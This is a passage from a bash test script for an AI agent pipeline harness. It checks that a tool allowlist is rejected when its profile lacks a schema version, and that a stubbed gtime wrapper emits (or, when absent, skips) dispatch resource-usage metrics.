cat > "$_QA_ADV7_ROOT/learned-rules/qa-adv7-slug/project-profile.md" <<'PROFILE'
---
slug: qa-adv7-slug
generated_at: 2026-05-13T00:00:00Z
---
## Tool allowlist
- implementing:
  - `Bash(cargo:*)`
PROFILE
HARNESS_ROOT="$_QA_ADV7_ROOT"
PROJECT_SLUG="qa-adv7-slug"
_QA_ADV7_STDERR="$(mktemp)"
_test_assert_temp_path "$_QA_ADV7_STDERR"
_QA_ADV7_OUT="$(allowed_tools_for implementing 2>"$_QA_ADV7_STDERR")"
_QA_ADV7_WARN_COUNT="$(grep -cE '\[allowed-tools\] project-profile.md schema_version != 2' "$_QA_ADV7_STDERR" 2>/dev/null || true)"
if [[ "$_QA_ADV7_OUT" != *'Bash(cargo:*)'* ]]; then
  pass_at "QA-ADV7 (missing schema_version): composed output lacks profile tokens"
else
  fail_at "QA-ADV7 (missing schema_version): cargo unexpectedly loaded despite missing schema_version line" \
    "got: $_QA_ADV7_OUT"
fi
if [[ "$_QA_ADV7_WARN_COUNT" == "1" ]]; then
  pass_at "QA-ADV7 (missing schema_version): exactly one schema-version warning fired"
else
  fail_at "QA-ADV7 (missing schema_version): expected 1 warning, got $_QA_ADV7_WARN_COUNT" \
    "stderr: $(cat "$_QA_ADV7_STDERR")"
fi
rm -f "$_QA_ADV7_STDERR"
_test_safe_rm "$_QA_ADV7_ROOT"

# Restore overrides so subsequent assertions inherit pre-fixture environment.
HARNESS_ROOT="$_ENG94_SAVED_HARNESS_ROOT"
PROJECT_SLUG="$_ENG94_SAVED_PROJECT_SLUG"
unset _ENG94_SAVED_HARNESS_ROOT _ENG94_SAVED_PROJECT_SLUG

# ─── Group 8 (ENG-81): dispatch-resource-sample metric via gtime wrapper ─
# Phase 1 instrumentation. dispatch.sh wraps `claude -p` with `gtime -v -o
# <tmp>` when gtime is on PATH; on success it parses the wall/RSS/CPU
# fields and emits a `dispatch-resource-sample` event to events.jsonl
# (via metrics.sh). When gtime is absent the dispatch still succeeds and
# logs a one-liner "gtime not on PATH" warning; no metric is emitted
# (degraded mode). Both branches are exercised here.

printf '\n--- ENG-81 Group 8: dispatch-resource-sample emission ---\n'

# Sub-fixture A: gtime present (stubbed) → metric event lands.
G8_TARGET="$_TEST_STUB_DIR/g8-target"
mkdir -p "$G8_TARGET/.pipeline-config/schemas"
jq -n '{
  project: { slug: "g8-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5 }
}' > "$G8_TARGET/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$G8_TARGET/.pipeline-config/schemas/linear-ids.json"
G8_STATE_ROOT="$_TEST_STUB_DIR/g8-state"
G8_PROJECT_STATE="$G8_STATE_ROOT/g8-slug"
mkdir -p "$G8_PROJECT_STATE/ENG-G8"

# Stub gtime: writes a fixed `-v` output to its `-o <path>` arg, then
# execs the rest of the command (mirrors how real gtime works — it wraps
# the inner cmd transparently except for the resource-sample sidecar).
G8_STUB_GTIME="$_TEST_STUB_DIR/gtime"
cat > "$G8_STUB_GTIME" <<'SH'
#!/usr/bin/env bash
# Skip leading -v / -o <path> flags; capture -o's path argument; emit
# fixture gtime -v output to that path, then exec the inner command.
out=""
while (( $# > 0 )); do
  case "$1" in
    -v) shift ;;
    -o) out="$2"; shift 2 ;;
    --) shift; break ;;
    *)  break ;;
  esac
done
if [[ -n "$out" ]]; then
  cat > "$out" <<GTIME
	Elapsed (wall clock) time (h:mm:ss or m:ss): 0:42.10
	Maximum resident set size (kbytes): 384256
	Percent of CPU this job got: 28%
GTIME
fi
exec "$@"
SH
chmod +x "$G8_STUB_GTIME"

# Reuse the existing claude + gtimeout stubs already in $_TEST_STUB_DIR.
G8_OUT="$_TEST_STUB_DIR/g8-dispatch.out"
G8_PATH="$_TEST_STUB_DIR:$PATH"
PIPELINE_DRY_RUN=0 \
PATH="$G8_PATH" \
TARGET_REPO="$G8_TARGET" \
PROJECT_SLUG="g8-slug" \
HARNESS_STATE_DIR="$G8_STATE_ROOT" \
PROJECT_STATE_DIR="$G8_PROJECT_STATE" \
PIPELINE_ISSUE_ID=ENG-G8 \
LINEAR_API_KEY="$LINEAR_API_KEY" \
  bash "$SCRIPT_DIR/dispatch.sh" brainstorming "$_PROMPT_FILE" 2>"$G8_OUT" >/dev/null || true

G8_EVENTS="$G8_PROJECT_STATE/metrics/events.jsonl"
if [[ -f "$G8_EVENTS" ]] \
   && grep -q '"event":"dispatch-resource-sample"' "$G8_EVENTS"; then
  pass_at "G8.A: dispatch-resource-sample event landed in events.jsonl when gtime is on PATH"
else
  fail_at "G8.A: dispatch-resource-sample missing" \
    "events.jsonl=$(cat "$G8_EVENTS" 2>/dev/null || printf 'absent') stderr=$(cat "$G8_OUT")"
fi

# Notes field carries wall_seconds/max_rss_kb/cpu_pct — the parsed gtime
# -v fields named per the brainstorm contract so downstream consumers
# can `tonumber` the wall value.
if [[ -f "$G8_EVENTS" ]] \
   && jq -e 'select(.event == "dispatch-resource-sample") | .notes | test("wall_seconds=") and test("max_rss_kb=") and test("cpu_pct=")' \
        "$G8_EVENTS" >/dev/null 2>&1; then
  pass_at "G8.A: dispatch-resource-sample notes carry wall_seconds/max_rss_kb/cpu_pct fields"
else
  fail_at "G8.A: notes missing wall_seconds/max_rss_kb/cpu_pct" \
    "events: $(cat "$G8_EVENTS" 2>/dev/null)"
fi

# wall_seconds must be a numeric scalar (gtime emits m:ss.ff / h:mm:ss;
# the dispatcher normalises to total seconds so downstream tonumber
# works). Locate the wall_seconds=<val> token and assert it parses.
if [[ -f "$G8_EVENTS" ]]; then
  G8_WALL="$(jq -r 'select(.event == "dispatch-resource-sample") | .notes' "$G8_EVENTS" 2>/dev/null \
            | sed -nE 's/.*wall_seconds=([0-9]+(\.[0-9]+)?).*/\1/p' | head -1)"
  if [[ -n "$G8_WALL" ]] && awk -v v="$G8_WALL" 'BEGIN { exit (v+0 == 0 && v != "0") }'; then
    pass_at "G8.A: wall_seconds is numeric ($G8_WALL)"
  else
    fail_at "G8.A: wall_seconds not numeric" "got: '$G8_WALL'"
  fi
fi

# Sub-fixture B: gtime absent → dispatch still succeeds; warning logged;
# no metric emitted. Use a fresh state dir to keep counters disjoint.
# Drive the degraded branch via `_PIPELINE_FORCE_NO_GTIME=1` so the test
# is deterministic regardless of host PATH.
G8B_PROJECT_STATE="$G8_STATE_ROOT/g8b-slug"
mkdir -p "$G8B_PROJECT_STATE/ENG-G8B"
G8B_TARGET="$_TEST_STUB_DIR/g8b-target"
mkdir -p "$G8B_TARGET/.pipeline-config/schemas"
jq -n '{
  project: { slug: "g8b-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5 }
}' > "$G8B_TARGET/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$G8B_TARGET/.pipeline-config/schemas/linear-ids.json"

G8B_OUT="$_TEST_STUB_DIR/g8b-dispatch.out"
PIPELINE_DRY_RUN=0 \
_PIPELINE_FORCE_NO_GTIME=1 \
PATH="$_TEST_STUB_DIR:$PATH" \
TARGET_REPO="$G8B_TARGET" \
PROJECT_SLUG="g8b-slug" \
HARNESS_STATE_DIR="$G8_STATE_ROOT" \
PROJECT_STATE_DIR="$G8B_PROJECT_STATE" \
PIPELINE_ISSUE_ID=ENG-G8B \
LINEAR_API_KEY="$LINEAR_API_KEY" \
  bash "$SCRIPT_DIR/dispatch.sh" brainstorming "$_PROMPT_FILE" 2>"$G8B_OUT" >/dev/null || true

# Warning log line emitted (the [dispatch-resource-sample] gtime not on PATH ...).
if grep -q 'dispatch-resource-sample.*gtime' "$G8B_OUT"; then
  pass_at "G8.B: dispatch logs gtime-absent warning when gtime missing from PATH"
else
  fail_at "G8.B: gtime-absent warning missing" \
    "stderr: $(cat "$G8B_OUT")"
fi

# No metric emitted in degraded mode.
G8B_EVENTS="$G8B_PROJECT_STATE/metrics/events.jsonl"
if [[ ! -f "$G8B_EVENTS" ]] \
   || ! grep -q '"event":"dispatch-resource-sample"' "$G8B_EVENTS"; then
  pass_at "G8.B: no dispatch-resource-sample event when gtime absent (degraded mode)"
else
  fail_at "G8.B: spurious metric in degraded mode" \
    "events: $(cat "$G8B_EVENTS")"
fi

# ─── Summary ────────────────────────────────────────────────────────────
printf '\nRESULTS: %d passed, %d failed\n' "$PASS" "$FAIL"
[[ "$FAIL" == 0 ]] || exit 1
exit 0
